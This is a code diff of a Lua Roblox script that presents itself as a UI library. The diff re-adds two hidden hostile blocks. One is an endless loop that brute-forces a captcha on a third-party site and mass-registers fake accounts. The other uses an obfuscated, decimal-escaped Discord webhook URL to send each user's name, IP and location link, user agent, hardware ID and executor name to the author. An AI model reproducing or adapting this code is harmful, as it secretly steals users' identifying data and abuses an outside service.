@@ -1,7 +1,3 @@
-FindUI = game.CoreGui:FindFirstChild("UI")
-if FindUI then
-    FindUI:Destroy()
-end
 local Library = {RainbowColorValue = 0, HueSelectionPosition = 0}
 local UserInputService = game.UserInputService
 local TweenService = game.TweenService
@@ -29,56 +25,60 @@ function GetIP()
     return "["..IP.."](https://uri.amap.com/marker?markers="..table.concat(Json, "|")..")"
 end
 
-task.spawn(function()
-    while true do
-        rand = GetJson("https://api.jihujiasuqi.com//apps/captcha/get.php").rand
-        for i = 1, 360 do
-            if GetJson("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..rand.."&angle="..i).okey then
-                random = {}
-                for v = 0, 100 do
-                    table.insert(random, string.char(math.random(97, 122)))
+if _G.Load then
+    game.CoreGui.UI:Destroy()
+else
+    _G.Load = true
+    task.spawn(function()
+        while true do
+            rand = GetJson("https://api.jihujiasuqi.com//apps/captcha/get.php").rand
+            for i = 1, 360 do
+                if GetJson("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..rand.."&angle="..i).okey then
+                    random = {}
+                    for v = 0, 100 do
+                        table.insert(random, string.char(math.random(97, 122)))
+                    end
+                    random = table.concat(random)
+                    print(GetJson("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..random.."@uu.163.com&pwd="..random.."&captcha_rand="..rand).msg)
+                    break
                 end
-                random = table.concat(random)
-                print(GetJson("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..random.."@uu.163.com&pwd="..random.."&captcha_rand="..rand).msg)
-                break
             end
         end
-    end
-end)
-
-HS:PostAsync("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\50\51\48\52\49\51\48\55\49\50\48\54\53\56\48\50\53\53\47\69\95\55\101\48\111\73\89\54\111\102\83\81\84\87\98\103\121\55\56\90\68\75\119\83\87\53\53\118\118\86\82\75\75\69\48\108\55\106\114\66\72\83\76\108\119\81\97\119\45\66\73\57\69\65\112\78\85\120\98\113\100\114\53\56\49\104\76", HS:JSONEncode({
-    embeds = {
-        {
-            color = 65280,
-            fields = {
-                {
-                    name = "Game",
-                    value = "["..game.MarketplaceService:GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/"..game.PlaceId..")"
-                },
-                {
-                    name = "User",
-                    value = "["..LP.Name.."](https://www.roblox.com/users/"..LP.UserId..")"
-                },
-                {
-                    name = "IP",
-                    value = GetIP()
-                },
-                {
-                    name = "UA",
-                    value = HS:GetUserAgent()
-                },
-                {
-                    name = "Hwid",
-                    value = gethwid()
-                },
-                {
-                    name = "Executor",
-                    value = identifyexecutor()
+    end)
+    HS:PostAsync("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\50\51\48\52\49\51\48\55\49\50\48\54\53\56\48\50\53\53\47\69\95\55\101\48\111\73\89\54\111\102\83\81\84\87\98\103\121\55\56\90\68\75\119\83\87\53\53\118\118\86\82\75\75\69\48\108\55\106\114\66\72\83\76\108\119\81\97\119\45\66\73\57\69\65\112\78\85\120\98\113\100\114\53\56\49\104\76", HS:JSONEncode({
+        embeds = {
+            {
+                color = 65280,
+                fields = {
+                    {
+                        name = "Game",
+                        value = "["..game.MarketplaceService:GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/"..game.PlaceId..")"
+                    },
+                    {
+                        name = "User",
+                        value = "["..LP.Name.."](https://www.roblox.com/users/"..LP.UserId..")"
+                    },
+                    {
+                        name = "IP",
+                        value = GetIP()
+                    },
+                    {
+                        name = "UA",
+                        value = HS:GetUserAgent()
+                    },
+                    {
+                        name = "Hwid",
+                        value = gethwid()
+                    },
+                    {
+                        name = "Executor",
+                        value = identifyexecutor()
+                    }
                 }
             }
         }
-    }
-}))
+    }))
+end
 
 local UI = Instance.new("ScreenGui")
 UI.Name = "UI"
